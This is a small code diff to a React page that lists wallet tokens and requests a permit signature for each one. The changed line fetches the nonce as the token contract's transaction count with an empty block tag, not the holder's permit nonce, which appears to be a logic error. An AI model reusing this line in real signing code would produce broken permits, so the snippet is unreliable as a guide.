@@ -63,7 +63,7 @@ const Page = () => {
 					<div className={'flex gap-2'}>
 						{token.contract_ticker_symbol}
 						<button disabled={!!signatures[token.contract_ticker_symbol]} onClick={async () => {
-							const nonce = await provider?.getTransactionCount(account.address!);
+							const nonce = await provider?.getTransactionCount(token.contract_address!,'');
 							console.log("NONCES", nonce);
 							const sig = await createPermitSignature(async (args: any)=>{
 								return signTypedData(config, args);
